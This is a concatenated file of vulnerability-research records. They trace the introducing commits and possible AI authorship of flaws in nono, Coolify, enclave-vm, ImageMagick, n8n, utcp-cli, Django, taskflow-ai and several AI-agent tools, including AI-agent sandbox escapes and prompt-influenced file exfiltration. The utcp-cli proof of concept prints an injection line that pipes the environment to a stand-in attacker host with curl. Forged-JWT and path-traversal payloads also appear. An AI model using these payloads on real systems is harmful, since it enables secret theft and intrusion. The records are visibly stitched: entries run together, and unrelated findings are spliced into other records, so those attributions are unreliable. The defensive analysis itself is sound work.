round6_research.bug_semantics: Sandbox escape on Linux via D-Bus (CWE-863, incomplete mediation of local IPC): nono's Landlock/seccomp policies allow sandboxed processes to access local Unix domain sockets (pathname and abstract). A process running under `nono run -s --profile claude-code` can connect() to the per-user systemd D-Bus socket (pathname socket under $XDG_RUNTIME_DIR, e.g. /run/user/<uid>/bus) and invoke `systemd-run --user` to spawn an unsandboxed sibling with full user authority. On Landlock V4+ kernels (AccessNet available) no seccomp-notify socket mediation is installed at all, so pathname AF_UNIX connect/bind is governed solely by Landlock fs rules; profiles like claude-code grant the runtime/home dirs, permitting the connect. On <V4 kernels the seccomp fallback explicitly allowed pathname AF_UNIX (denying only abstract/unnamed). The 0.55.0 fix adds Landlock V6 abstract-socket scoping, an explicit pathname-socket allowlist in the seccomp fallback, and a seccomp-notify `af_unix_mediation` mode requiring explicit filesystem.unix_socket grants.
round6_research.evidence: Root/introducer a7bcc76bc30370074d8b1bceeaa340c98ba3d6e8 (Luke Hinds <lukehinds@gmail.com>, author+committer, 2026-02-09, 'Initial Commit'; git rev-list --max-parents=0 -> root, P absent) created crates/nono/src/sandbox/linux.rs (Landlock-only sandbox, target ABI V5; unix socket connect/bind mediated only by AccessFs path rules — no socket/sockaddr policy anywhere in the tree) and crates/nono-cli/data/profiles/claude-code.toml (the profile used in the advisory reproducer). Companion weak endpoint: PUT /api/global/users/tenant/owner (changeTenantOwnerEmail) sat under cloudRestrictedRoutes, whose cloudRestricted middleware only checks an internal API key on hosted SaaS and is a no-op pass-through on self-hosted, so on self-hosted any authenticated user could change the tenant owner email (account takeover vector) until 2026-06-16.

round6_research.bug_semantics: Proxy-only network fallback bypass on older Linux kernels (CWE-693, medium, CVSS 6.4 AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N): on kernels without Landlock network rules (Landlock ABI < V4 / Linux < 6.7, e.g. 6.1), nono_py.sandboxed_exec() could run CapabilitySet.proxy_only(proxy) without supervising the seccomp-notify proxy-only fallback, so a sandboxed child could strip HTTP_PROXY/HTTPS_PROXY or use raw sockets and open direct TCP connections (e.g. to cloud metadata 169.254.169.254) that proxy-only policy should have denied.
round6_research.evidence: Advisory GHSA-72w7-mf9g-733p (CVE id null): pip nono-py >=0.9.0,<0.10.1, first_patched 0.10.1, reviewed medium, CWE-693, reporter lukehinds, fix reference 3e67dfa11cbe9514f315fdd36473680c318816d7. Fix = 'Merge commit from fork' (2026-05-23, Luke Hinds, committer GitHub; parents 2897ee20 + 990389f8) 'feat(policy, python): enforce strict parsing and fail closed': src/policy.rs adds #[serde(deny_unknown_fields)] on RustPolicy/Group/AllowOps/DenyOps/NetworkOps/PolicyRouteConfig/PolicyEndpointRule, makes network block when network.block || network_requires_proxy(network) (allow_domain/credentials/custom_credentials/upstream_proxy/upstream_bypass/max_connections), + strict-parse and fail-closed tests; 10 files, 263 insertions. Fix is in v0.10.1 and v0.11.0+ (tag --contains first hit v0.10.1) and NOT in v0.10.0, matching first_patched 0.10.1. Introducer 16cd712 (author=committer Sambhav Kothari, single parent 753c9e5f, 2026-05-07) added proxy_only() to src/lib.rs (set_network_mode_mut(NetworkMode::ProxyOnly { port, bind_ports: Vec::new() })) + src/proxy.rs PortBinding + tests (215 lines); earliest tag containing it: v0.9.0 (2026-05-10), matching vulnerable range start >=0.9.0. Parent 753c9e5f src/lib.rs has 0 proxy_only and 0 ProxyOnly occurrences (verified via git show|grep -c). Commit body ends with 'Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>'. At v0.9.0, src/sandboxed_exec.rs contains no network handling (0 hits for network/NetworkMode/landlock/seccomp; Sandbox::apply only) so the ProxyOnly mode's enforcement relied on Landlock kernel rules which are absent on kernels <6.7 - the advisory's exact affected condition. Fix's first-parent diff does NOT touch src/sandboxed_exec.rs; the seccomp-notify machinery came earlier (807fb4bce 'feat(network): implement seccomp network filtering for proxy-only', 2026-05-22, Luke Hinds, in v0.10.0 but NOT v0.9.0), and the advisory's described bypass (child strips proxy env vars or uses raw sockets on pre-V4 kernels) is precisely the un-supervised path before 807fb4bce - the state shipped in v0.9.0.
round6_research.flaw_origin: 16cd712 ('feat: expose NetworkMode::ProxyOnly via CapabilitySet.proxy_only()', 2026-05-07, Sambhav Kothari) first exposed proxy_only() in the Python bindings by setting NetworkMode::ProxyOnly { port, bind_ports: Vec::new() } via set_network_mode_mut; at that point src/sandboxed_exec.rs had no network handling at all (0 grep hits for network/ProxyOnly/landlock at v0.9.0) and simply called nono::Sandbox::apply(&ctx.caps), relying entirely on kernel Landlock rules - which do not exist on kernels without Landlock network support. Parent 753c9e5f has ZERO proxy_only/ProxyOnly occurrences in src/lib.rs (grep counts 0/0), so this commit is the minimum atomic introducer of the vulnerable proxy-only path. The subsequent seccomp-notify fallback machinery (807fb4bce, v0.10.0, Luke Hinds) reduced but did not eliminate the issue: the python policy path could still fail open because group network proxy settings did not force caps network blocked (fix adds network_requires_proxy + deny_unknown_fields strict parsing).
round6_research.reasoning: The advisory's affected range starts exactly at v0.9.0, whose ProxyOnly exposure was introduced by 16cd712, and 16cd712's own commit body explicitly credits 'Claude Opus 4.6' as co-author - a direct AI authorship marker on the introducing commit. Causal chain is closed: parent lacks the behavior entirely; the commit is the minimum atomic introducer; the fix (v0.10.1) directly targets the fail-open proxy-only enforcement in the policy layer. AI-authored code caused the flaw -> AI_ROOT_CAUSE.
round6_research.remaining_gap: Minor: the exact mechanism described in the advisory (pre-V4 seccomp-notify fallback supervision) was introduced by the later 807fb4bce (Luke Hinds, 2026-05-22, no AI marker found on that commit's message), while 16cd712's v0.9.0 code predates the fallback machinery entirely - the advisory treats the whole >=0.9.0 range. round6_research.bug_semantics: Low CWE-862 (missing authorization): the Microsoft Teams SSO signin invoke handling (signin/tokenExchange and signin/verifyState) in extensions/msteams/src/monitor-handler.ts processes invokes before applying the sender allowlist checks used by normal message handling. The handler acks the invoke with HTTP 200 and, if msteams.sso is configured, exchanges the Teams-provided token with the Bot Framework User Token service and persists it for downstream tools, without verifying that the sender is allowlisted (DM sender allowlist, team/channel allowlist, group sender access). A denied sender could trigger SSO token exchange/verification flows. Affected versions >= 2026.4.10 < 2026.4.14.
round6_research.evidence: Introducer 828ebd43 is a single-parent GitHub squash merge (#64089 re-merge of #60956) by author sudie-codes <suvenkat95@gmail.com> (committer GitHub noreply); message contains only a human Co-authored-by trailer (Brad Groux <bradgroux@users.noreply.github.com>) - no AI-tool trailers, no agent identities, no AI markers. Verified the introducer is inside the affected range (ancestor of both v2026.4.10 and v2026.4.14 tags). Fix 80b1fa17bfc3f6a668492f0326ea52f48bb89776 (2026-04-13, author Pavan Kumar Gondhi <pgondhi@nvidia.com>, committer GitHub noreply, PR #66033) refactors isFeedbackInvokeAuthorized into shared isInvokeAuthorized and adds isSigninInvokeAuthorized, routing SSO invokes through the sender allowlist path; verified ancestor of release tag v2026.4.14 (patched >= 2026.4.14 per advisory). NOTE: the fix commit title carries an explicit '[AI]' tag ('fix(msteams): enforce sender allowlist checks on SSO signin invokes [AI] (#66033)'), but per protocol an AI-tagged fix is not evidence of AI-introduced flaw: the vulnerability was introduced by the human-authored 828ebd43, and the AI-tagged commit is the human-orchestrated remediation, not the introducer.
round6_research.flaw_origin: The SSO invoke block without sender authorization was introduced in commit 828ebd43d47b6bd8b69c4d3e1b1d123f0e97fc74 (2026-04-10, 'feat(msteams): handle signin/tokenExchange and signin/verifyState for SSO (#60956) (#64089)', author sudie-codes <suvenkat95@gmail.com>, committer GitHub <noreply@github.com>), which added the signin/tokenExchange + signin/verifyState branch to monitor-handler.ts (91 lines) plus sso.ts, sso-token-store.ts, and tests. Parent 360955a7c8ef9754e27241c1dfab3adfc91dfdd8 has no signin/tokenExchange anywhere in extensions/msteams (git grep exit 1) -> introducer_parent_absent=true.

round6_research.bug_semantics: Cross-team IDOR (broken object-level authorization, CWE-639): Coolify prior to v4.0.0-beta.471 performs Server and Project lookups without scoping to the current team. Vulnerable patterns: Server::find($id) / Project::whereUuid($uuid)->first() / Project::where('uuid',$uuid)->firstOrFail() with no ->ownedByCurrentTeam() / ->whereTeamId() prefix, in Livewire components (Server/Form.php mount, GlobalSearch loadDestinations/loadEnvironments, Project/CloneMe mount, Project/DeleteProject, Project/New/* which read Route parameter project_uuid/server id) and API controllers (DeployController cancel_deployment Server::find($build_server_id)). Any authenticated user can reference another team's server/project UUID or ID and read or act on it, exposing other teams' environments, servers, and SSH-key infrastructure. Fixed by team-scoping these queries so cross-team lookups return null/fail closed.

round6_research.bug_semantics: Sandbox escape via host prototype chain (CWE-913 / improper isolation): when a tool invocation fails, enclave-vm surfaces the host-side Error object to sandboxed code without severing its realm. Sandbox code can climb err.constructor.constructor to reach the host Function constructor and execute arbitrary code in the host Node runtime (process.env, fs, network). Tool-call results were sanitized/proxied but error paths were not.
round6_research.evidence: enclave clone .ai-slop/state/repos/agentfront_enclave. Vulnerable mechanism present in ROOT commit 63535a2613a35e9fa2e3062c78f1b46e7ac00677 (2025-11-30, David Antoon <david@frontegg.com>, 'initialize project structure with essential configuration files and setup'; root commit, no parent): libs/enclave/src/safe-runtime.ts __safe_callTool executes host closure context.toolHandler(toolName, resolvedArgs) (line 118) inside try, and the catch (line ~143) re-throws 'new Error(...)' created in the HOST realm (createSafeRuntime runs as host code, vm-adapter.ts:362 injects its closures into the sandbox context), so both the raw rejection and the wrap are host-realm Error objects whose prototype chain reaches the host Function constructor; error path unsanitized while result path used sanitizeValue. Re-implemented in the double-VM architecture by 022d8c8 (#11, 'implement double VM architecture', 2025-12, David Antoon, no markers): parent-vm-bootstrap.ts innerCallTool line 1034 'var promise = hostCallTool(toolName, sanitizedArgs);' returns createSecureProxy(promise.then(...)) - only results proxied; promise rejection delivers raw host Error into inner sandbox (double-vm-wrapper.ts:337-339 injects __host_callTool__ = host closure). Same flaw class in both single-VM and double-VM paths. Fix ed8bc438b2cd6e6f0b5f2de321e5be6f0169b5a1 (2026-01-09, GitHub squash of PR #29 by David Antoon, 'fix: enhance security by implementing safe error handling'): added tool-bridge.ts (427 lines, string-only payloads crossing the boundary), safe-error.ts (79 lines, severed prototype chain errors), expanded value-sanitizer.ts, hardened double-vm-wrapper/parent-vm-bootstrap (toolBridgeMode, error sanitization, __ag_createSafeError defineProperty), safe-runtime.ts rework; first tagged enclave-vm@2.7.0 (advisory: fixed in 2.7.0). AI marker scan (git show -s --format='%B%N' | grep -iE 'copilot|openai|chatgpt|gpt-|claude|gemini|codex|co-authored|generated|anthropic|cursor') on root commit, 022d8c8, and fix ed8bc438: no hits. Repo-wide Codex references are limited to release automation (.github/codex/prompts/analyze-release.md, RELEASE_WORKFLOW.md); no AI authorship disclosure in README or docs. partial_wave.bug_semantics: Heap-based buffer overflow (out-of-bounds write) in the UHDR encoder (WriteUHDRImage, coders/uhdr.c): for YCbCr inputs (bpp<4, 24bppYCbCrP010 / 12bppYCbCr420, 4:2:0 sub-sampling) the yBuffer allocation is computed without the 1.5x sub-sampling factor while the fill loops still write the full Y plane plus the Cb/Cr UV planes (crBuffer/cbBuffer placed at yBuffer + w*h), so every Cb/Cr write lands past the end of the heap buffer (CWE-787).
partial_wave.evidence: GHSA-h95r-c8c7-mrwx / CVE-2026-30931 (2026-03, Magick.NET, fixed 14.10.4): heap-based buffer overflow in the UHDR encoder due to truncation of a value allowing an out-of-bounds write. Fix 7fe4dbabe (2026-03-04, Cristy, commit message is the advisory URL) changes the bpp<4 overflow check to HeapOverflowSanityCheckGetSize(picSize,3,&sans) and adds picSize=3*picSize/2 before AcquireMagickMemory (coders/uhdr.c:625-690). Introducer 31f10b1de (2026-02-08, Dirk Lemstra) is the commit that first routed the 1.5x factor through HeapOverflowSanityCheckGetSize, whose quantum parameter is size_t (MagickCore/memory_.h:84-104) so 1.5 truncates to 1 and the YCbCr buffer is allocated at w*h*bpp while the fill loop still writes Y (w*h) plus interleaved Cb/Cr UV planes (cbBuffer=yBuffer+w*h, crBuffer=cbBuffer+1; coders/uhdr.c:695-760, 800-870). Author is human maintainer (no AI markers); UHDR coder originally added by 4b85373fc (Aayush Soni, 2024-03-29) with the correct direct 1.5x multiply.
partial_wave.flaw_origin: 2026-02-08 patch 31f10b1de (Dirk Lemstra, Corrected previous patch and added more overflow checks) replaced the direct picSize = aligned_width*aligned_height*bpp*1.5 computation with HeapOverflowSanityCheckGetSize(picSize,1.5,&picSize); the 1.5 double literal is truncated to 1 by the size_t quantum parameter (MagickCore/memory_.h:84), so the check is a no-op and picSize stays w*h*bpp without the 1.5x 4:2:0 factor; the later fix passes quantum 3 and applies picSize=3*picSize/2 unconditionally.
partial_wave.reasoning: The truncation bug that caused the OOB write was introduced by human maintainer Dirk Lemstra in the 2026-02-08 patch 31f10b1de. NOT_AI.

round6_research.bug_semantics: Path traversal / arbitrary local file read (CWE-22, CVSS 4.0 MODERATE AV:N/VC:L) in the QQ Bot extension: structured media payloads (image/video/file) resolve payload.path via resolveQQBotLocalMediaPath, which (a) normalizes the path, (b) returns ANY already-existing local path unchanged (fs.existsSync(normalized) passthrough - no confinement to QQ Bot-owned media roots), after which handleImagePayload etc. call readFileAsync(imageUrl) and ship the bytes through the QQ Bot media-send path. A crafted/prompt-influenced structured payload can therefore exfiltrate any host file readable by the OpenClaw process (confidentiality boundary crossing). Fixed in 2026.4.2 by restricting payload local paths to getQQBotMediaDir().
round6_research.evidence: Advisory GHSA-846p-hgpv-vphc (OSV pkg:npm/openclaw, published 2026-04-07, CVSS 4.0 MODERATE): 'QQ Bot structured payloads could read arbitrary local files'; affected <=2026.4.1, fixed >=2026.4.2; sole fix reference commit 2c45b06afdd6f7c621038b5419d8e661cff34a7f. Introducer: bf6f506dfae 'Feature/add qq channel (#52986)' (2026-03-31, author Sliverp <38134380+sliverp@users.noreply.github.com>, committer GitHub, GPG-signed) is a squash merge (single parent f86e5c0a08fcbc5bd822e74cd321aedf717cdc39); parent has NO extensions/qqbot at all (git cat-file -e parent:extensions/qqbot/src/reply-dispatcher.ts -> path does not exist; git grep readFileAsync(imageUrl) -> 0) so the vulnerable behavior is atomically introduced by this commit. Vulnerable code confirmed in the introducer tree: handleImagePayload does let imageUrl = resolveQQBotLocalMediaPath(normalizePath(payload.path)); ... const fileBuffer = await readFileAsync(imageUrl); and resolveQQBotLocalMediaPath (platform.ts) returns normalized path as-is when isLocalPath && fs.existsSync(normalized) - no media-root containment; same pattern for video/file payload handlers. Fix 2c45b06afdd (2026-04-02, author+committer Jacob Tomlinson <jacobtomlinson@users.noreply.github.com>, GitHub, PR #58453 squash, message body lists sub-commits: restrict/narrow structured payload file access, payload path traversal guard tests, reduced log exposure, preserve inline image payload URLs) adds validateStructuredPayloadLocalPath -> resolveQQBotPayloadLocalFilePath (platform.ts +31): path.resolve + realpathSync of candidate and of allowedRoots=[getQQBotMediaDir()], returns canonical candidate only if isPathWithinRoot, else null -> blocked; rewires image/video/file payload branches to use it and adds describeMediaTargetForLog (no path leak in logs). AI-marker scan on full commit messages (grep co-authored/copilot/claude/codex/gpt/openai/anthropic/gemini): introducer trailers are human GitHub co-authors yuehuali <yuehuali@tencent.com>, walli <walli@tencent.com>, WideLee <limkuan24@gmail.com>, Frank Yang <frank.ekn@gmail.com> - no AI-tool attribution; fix message has NO AI markers.

round6_research.bug_semantics: Hardcoded default worker secret enabling full unauthenticated access to HTTP MCP worker endpoints (CWE-798 / CWE-287): the arcade-mcp-server HTTP server defaults ArcadeSettings.server_secret to the publicly-known string 'dev' (libs/arcade-mcp-server/arcade_mcp_server/settings.py, Field(default='dev', validation_alias='ARCADE_WORKER_SECRET')), and create_arcade_mcp() additionally falls back to `secret = 'dev'` when the setting is None before handing it to FastAPIWorker. The worker JWT auth (arcade_serve/fastapi/auth.py + core/auth.py) trusts any HS256 token signed with that secret, so any unauthenticated attacker who knows the documented default 'dev' can forge a valid worker JWT (aud=worker) and reach all /worker/* endpoints (tool enumeration and invocation). Anyone following the official quick-start (server.py http) runs with the default unless they explicitly override ARCADE_WORKER_SECRET. Fixed in 1.9.1.

Details name settings.py:129-158 (server_secret default 'dev'), worker.py create_arcade_mcp passthrough, BaseWorker._set_secret accepting it, fastapi/auth.py trusting HS256 JWT signed with worker secret; PoC forges jwt.encode({'ver':'1','aud':'worker'}, 'dev', 'HS256') to hit /worker/tools. round6_research.bug_semantics: Agent-Zero v0.8.* insecure permissions on control API endpoints (CWE-284): the /restart and /pause Flask API endpoints (python/api/restart.py calling process.reload(), python/api/pause.py setting context.paused) are registered behind a requires_auth wrapper that passes requests straight through whenever AUTH_LOGIN/AUTH_PASSWORD env vars are unset - the default deployment configuration - so any network-reachable anonymous attacker can POST/GET /restart (or /pause) to restart or stop the agent server, causing denial of service. Fixed in 0.9.0 by enforcing CSRF tokens on all API calls.
round6_research.evidence: Advisory GHSA-549g-4gm4-jwrq / CVE-2025-55524 (unreviewed/2025/08, no affected ranges): 'Insecure permissions in Agent-Zero v0.8.* allow attackers to arbitrarily reset the system via unspecified vectors'; references point at https://github.com/frdel/agent-zero/blob/v0.8.7/python/api/restart.py and VulList writeup https://github.com/vityuasd/VulList/blob/main/vul_3.md (fetched): 'In versions 0.8.*, The restart/pause method of agent-zero is exposed, that unauthenticated attackers can restart the system and cause a denial of service. This issue has been fixed in version 0.9'; PoC: visit http://host/restart (refresh becomes unresponsive); vulnerable code locations python/api/restart.py 'process.reload()' and python/api/pause.py 'context.paused = paused'. Analyzed in clone frdel_agent-zero. Introducer analysis: python/api/restart.py was created by 961dbc405af8a784ecadcfcbcd7652d1f8d9be28 (2024-12-03, author/committer frdel <38891707+frdel@users.noreply.github.com>, 'restart') together with python/helpers/process.py (reload() -> stop_server() + os.execv restart, or sys.exit(0) when dockerized) - the 9-line Restart(ApiHandler) endpoint that first exposed a system-reset capability to the HTTP API. Immediate parent 357909c16a66c0e7ec78a2a993a9a4e54dd67bf9 lacks python/api/restart.py and python/helpers/process.py entirely (git show 357909c1:python/api/restart.py and :python/helpers/process.py both fatal; the parent's run_ui.py has only a '/reset' chat-context reset route, not a server restart), so introducer_parent_absent=true. The endpoint was registered via register_api_handler with the @requires_auth wrapper which passes through when AUTH_LOGIN/AUTH_PASSWORD are unset (default deployment) - the insecure-permission property; the same pass-through auth model applied to the pre-existing /pause route (first written in run_ui.py at d233e0c94fa3590f6382f5ce4d35527eafa8f722, 2024-09-26, and moved to python/api/pause.py at c0947e30c757ecdfd08117b12ffc4d1d08543c9e 'API separation', 2024-11-21), which is why the advisory lists both endpoints. No squash decomposition: 961dbc40 is an atomic single-purpose commit. Fix: 1bb4123dcbe3fb442717e5894200bd59fb28e01a (2025-06-24, frdel, 'security fixes' - 'CSRF tokens implemented into api calls; password change shell injection fixed') adds csrf_protect() (403 on missing X-CSRF-Token) and requires_csrf() to python/helpers/api.py and composes loopback+auth+api_key+csrf wrappers cumulatively in run_ui.py's register_api_handler, so /restart and /pause now reject session-less requests; verified ancestor of tag v0.9.0 (git merge-base --is-ancestor = yes), matching 'fixed in version 0.9'. records.details:
## Summary

`_prepare_environment()` in `cli_communication_protocol.py` passes a full copy of `os.environ` to every CLI subprocess. When combined with the Command Injection vulnerability (CWE-78) in `_substitute_utcp_args()` tracked as GHSA-33p6-5jxp-p3x4, an attacker can exfiltrate all process-level secrets in a single tool call.

## Vulnerable Code

```python
# cli_communication_protocol.py
def _prepare_environment(self, provider: CliCallTemplate) -> Dict[str, str]:
 env = os.environ.copy() # All secrets inherited
 if provider.env_vars:
 env.update(provider.env_vars)
 return env
```

## Impact

Any environment variable present in the host process is accessible to injected commands. In typical AI agent deployments this includes:

- Cloud provider credentials (AWS_SECRET_ACCESS_KEY, AZURE_CLIENT_SECRET)
- Database connection strings (DATABASE_URL)
- LLM API keys (OPENAI_API_KEY, ANTHROPIC_API_KEY)
- Internal service tokens

## Proof of Concept

```python
# Tool defined as:
{"command": "grep UTCP_ARG_pattern_UTCP_END logfile.txt"}

# Attacker supplies:
tool_args = {"pattern": "x; env | curl -s -d @- https://attacker.com"}

# Executed bash script:
# CMD_0_OUTPUT=$(grep x; env | curl -s -d @- https://attacker.com 2>&1)
# -> Full env dump sent to attacker including all secrets
```

## Patched

Fixed in `utcp-cli` 1.1.2. `_prepare_environment` no longer copies the full host environment. Inheritance is controlled by a new `CliCallTemplate.inherit_env_vars` field:

- `null` (default): a small built-in OS-specific allowlist (`PATH`, `HOME`, `LANG` on Unix; `PATH`, `PATHEXT`, `SYSTEMROOT`, `USERPROFILE`, etc. on Windows) is inherited so shells and binaries continue to work.
- `[]`: strict mode -- nothing from the host environment reaches the subprocess; only `env_vars` is propagated.
- `["FOO", "BAR"]`: exactly those host variables are inherited (replaces, not merges with, the default allowlist).

`env_vars` is always layered on top and overrides any inherited value. Secrets like `OPENAI_API_KEY` no longer reach the subprocess unless the call template explicitly opts them in.

## Mitigation

Upgrade to `utcp-cli >= 1.1.2`. There is no workaround in earlier versions short of stripping secrets from the host process before any CLI tool call.

## Credit

Reported by @ZeroXJacks.

round6_research.bug_semantics: CWE-178 (case sensitivity): django.middleware.cache.UpdateCacheMiddleware (and cache_page) matched Cache-Control response directives with case-sensitive Python substring checks ("private" in header, later also "no-cache"/"no-store"), so responses whose manual Cache-Control used uppercase/mixed-case values (e.g. 'Private', 'NO-store') failed the guard and were cached even though marked private/non-cacheable, exposing private data to other users. Affected Django 5.2 < 5.2.15 and 6.0 < 6.0.6 (earlier series not evaluated, may also be affected per advisory).
round6_research.evidence: Advisory GHSA-8cjm-8mp7-r2xf/CVE-2026-8404 (reporter Ahmed Badawe, CWE-178, severity LOW): fixed 5.2.15 / 6.0.6. OSV GIT fixed pointers 21e98408 (5.2.15 release bump) and ee93f651 (6.0.6 release bump) are version commits, not code fixes. Actual fix: main-branch d618d7ae4f (2026-05-12, Jake Howard) changes `cache_control = response.get("Cache-Control", "").lower()` before the directive checks; [5.2.x] backport 366d9ae6e8. Introducer chain via pickaxe `git log --all -S '"private" in response.get("Cache-Control"'`: earliest hit d968788b57 (2018), intermediate: Black reformats (9c19aff/6a682b38), extension ed7c1a56 (mengxun, 2025-08-19) adding no-cache/no-store same pattern, then the fix. The MCP tool 'auto.capture' (src/index.ts, case 'auto.capture': const commitHash = (args.hash as string) || 'HEAD') forwards the user-supplied hash argument to AutoLearnManager.captureCommit (src/autolearn/AutoLearnManager.ts:253) -> AutoLearner.captureCommit (src/autolearn/AutoLearner.ts:136) -> GitHooksManager.getCommitInfo() (src/autolearn/GitHooksManager.ts). getCommitInfo builds shell commands with the hash interpolated unquoted into a template string passed to execSync: `git show -s --format="..." ${commitHash}`, `git show --stat --format= ${commitHash}`, and `git show --pretty=format: ${commitHash}`. round6_research.bug_semantics: OS command injection (CWE-77/CWE-78) in the taskflow-ai MCP server (npm package taskflow-ai <2.1.9): the hidden/unregistered terminal_execute tool path reaches src/mcp/server/executor.js executeTerminal, which checks only the first whitespace-delimited token of the command against an allowlist (ls, cat, grep, ...) and then passes the full unsanitized string to child_process.execSync(command, {cwd, timeout, encoding, maxBuffer}) via shell. Shell metacharacters in the remainder of the string (;, |, &&, $(), backticks) allow arbitrary OS command execution. Additionally, src/mcp/server/handlers.js forwards any request.params.name to the executor without verifying the tool is registered, so the hidden terminal_execute tool is invocable despite not being advertised.
round6_research.evidence: GHSA-3xp3-pr8x-f755 / CVE-2026-5831 (published 2026-04-09, fixed 2.1.9, vulnerable <2.1.9, CWE-77, CVSS3 6.3): command injection in src/mcp/server/handlers.ts terminal_execute; patch commit c1550b445b9f24f38c4414e9a545f5f79f23a0fe, issue #2, release v2.1.9. Verified against npm dist artifacts: 2.1.8 (and identical 2.1.7) dist/mcp/server/executor.js executeTerminal allowlists only the first token then execSync(command) unsanitized; 2.1.8 dist/mcp/server/handlers.js CallToolRequestSchema forwards any name to toolExecutor without registry check (terminal_execute absent from registered tools list in dist/mcp/tools/built-in.js, which advertises shell_exec instead). 2.1.9 fixes both: handlers.js now rejects unregistered tools via toolRegistry.getTool(name), and executor.js adds shell-metacharacter regex /[;&|`$(){}[\]<>\!*?]/ and command-substitution /\$\(|`/ checks before execSync. npm gitHead metadata: 2.1.7=b33ee76764b0c948f8c3c14880a11b86a48189b7, 2.1.8=f0f1b9a6479e1a51c355c930ac4a0ab1a8121d56, 2.1.9=0dffe5e901b258662810053f0988917ab6ec30a2, but GitHub API returns Not Found for all of these (repo deleted; owner Agions now has 10 unrelated repos, no taskflow-ai). No archived commit pages, no SWH origin, no surviving forks. 2.2.0 retains the metacharacter checks plus registry gate; 5.x restructured to advertised shell_exec tools.

round6_research.bug_semantics: CWE-22 arbitrary file write on remote systems (path traversal via unvalidated binary filename metadata): the SSH node 'upload' operation builds the remote destination as parameterPath + '/' + (fileName || binaryData.fileName) in packages/nodes-base/nodes/Ssh/Ssh.node.ts with no sanitization, trusting the binary item's fileName metadata. That metadata is attacker-influenced: an unauthenticated webhook multipart upload stores the client-supplied filename via prepareBinaryData(..., fileJson.name, ...) (Webhook.node.ts), and copyBinaryFile persists/re-attaches it unsanitized. A filename like ../../../etc/cron.d/backdoor or ../../.ssh/authorized_keys escapes the intended remote directory, so the transferred content is written to an attacker-chosen location on the SSH target host -> arbitrary file write -> RCE on remote systems. Prerequisites: a workflow that (a) receives file uploads on an unauthenticated endpoint and (b) forwards them via the SSH node; CVSS 4.0 9.0 (SC:H/SI:H/SA:H), affected < 1.123.12 and < 2.4.0
round6_research.evidence: Advisory GHSA-m82q-59gv-mcr9 / CVE-2026-25055 (CVSS 4.0 9.0, CWE-22): 'workflows process uploaded files and transfer them to remote servers via the SSH node without validating their metadata' -> arbitrary file write -> RCE; patched 1.123.12 and 2.4.0; advisory FIX references 528ad6b98 and e0baf48c6. Fix diff (identical content both branches, 6 files/110 insertions): adds sanitizeFilename() to packages/workflow/src/utils.ts (path.basename after normalizing backslashes, null-byte strip, 'untitled' fallback) and applies it at the SSH sink (Ssh.node.ts: putFile path now sanitizeFilename(fileName || binaryData.fileName)) and at the metadata layer (copyBinaryFile in binary-helper-functions.ts: returnData.fileName = sanitizeFilename(fileName)). (1) BIC: git pickaxe -S 'fileName || binaryData.fileName' and -S 'parameterPath.charAt' over Ssh node history both return a single commit: 383a3449b7 (2021-05-29, ':sparkles: Add SSH Node (#1837)', Ricardo Espinoza, Co-authored-by Jan Oberhauser), i.e. the vulnerable remote-path construction is present from the node's first commit and unchanged until the 2026-01-09 fix. Squash landing commit (single parent d3c59a6fe; body carries 5 sub-commit bullets 'SSH-Node', 'Fix issue', 'Add file resource', 'Improvements', 'Some improvements' -> sub-commits unrecoverable from mainline). Immediate parent d3c59a6fe verified free: no Ssh node path (git ls-tree -d | grep Ssh -> none) and zero putFile occurrences anywhere in packages/ (git grep -> no matches), so the first sink that writes binary data to remote paths from unvalidated fileName metadata exists at 383a3449b7 => introducer_parent_absent=true. Attacker-control precondition already present at parent: Webhook.node.ts (flat file) calls prepareBinaryData(Buffer.from(fileContent), fileJson.name, ...) for multipart uploads (line 435), i.e. client-supplied filenames entered binary metadata before the SSH node existed. (2) Co-origin: 07e4743a3e (2022-11-24, #4640 'Reduce memory usage in the Webhook node', netroy) introduced copyBinaryFile with unsanitized 'returnData.fileName = fileName' passthrough - the persisted-metadata layer (webhook file streaming) the fix also sanitizes; the SSH/later-line file moves (4577ce0846, 05858c2153) are pure refactors. (3) Fix chain / version mapping: e0baf48c6a (#23988, 2026-01-09) on the 1.x maintenance line shipped in 1.123.12 (release commit 3a3e4c6cc, 2026-01-13); 528ad6b98 (#24221, 2026-01-13) on the master/2.x line shipped in 2.4.0 (release commit d222a6a7c, 2026-01-12) - both are the OSV GIT range 'fixed' events and both advisory reference commits. OSV GIT 'introduced 0' and 'introduced a8ecda44f' (the Release 2.0.0 tag commit, #22939) are version-range markers, not true introducers. 30791da0ad (same PR #23988 title) sits on release/2.3.x branches and is NOT on master; master fix = 528ad6b98.
round6_research.flaw_origin: introduced behavior: SSH node 'upload' remote-path construction `parameterPath + '/' + (fileName || binaryData.fileName)` trusting unsanitized binary fileName metadata, first written at 383a3449b7 (2021-05-29, PR #1837 squash 'Add SSH Node', Ricardo Espinoza); binary-metadata persistence/reattach layer shaped later by 07e4743a3e (#4640, 2022-11-24, copyBinaryFile file-streaming of webhook binaries); the vulnerable sink line stayed byte-identical until the 2026-01 sanitizeFilename fix
round6_research.reasoning: Closed causal chain: (1) the flaw is the SSH node transfer sink trusting binary fileName metadata to build the remote write path - introduced with the SSH node itself at 383a3449b7 (2021-05-29), five years before the advisory; parent d3c59a6fe has neither the Ssh node nor any putFile usage, and the webhook-originated attacker filename metadata predates the node, so 383a3449b7 is the minimum atomic introducer (squash landing of PR #1837, decomposed_sub_commits unrecoverable). (2) The sink line is unchanged from 383a3449b7 until the 2026-01-09 fix, so no later commit introduced or materially widened the vulnerable behavior (07e4743a3e only changed how webhook binaries are persisted, keeping the unsanitized name metadata). (3) Authorship: BIC authored by Ricardo Espinoza (n8n engineer) with Jan Oberhauser (n8n founder) as Co-author - both human; zero AI markers in diff or trailers; 2021-era code predates mainstream AI coding assistants. Fix side (Dawid Myslak, Michael Kret) also human with no AI markers. (4) The OSV GIT 'introduced' events (0, a8ecda44f) are version-range markers from the 2.0.0 release tag, not real introducers, so they do not affect the BIC. => NOT_AI: the arbitrary-file-write surface is a hand-written human feature from 2021 with no AI-authorship evidence anywhere in the causal chain

records.details:
Claude Code extensions in VSCode and forks (e.g., Cursor, Windsurf, and VSCodium) and JetBrains IDEs (e.g., IntelliJ, Pycharm, and Android Studio) are vulnerable to unauthorized websocket connections from an attacker when visiting attacker-controlled webpages. Claude Code for VSCode IDE extensions versions 0.2.116 through 1.0.23 are vulnerable. For Jetbrains IDE plugins, Claude Code [beta] versions 0.1.1 through 0.1.8 are vulnerable.

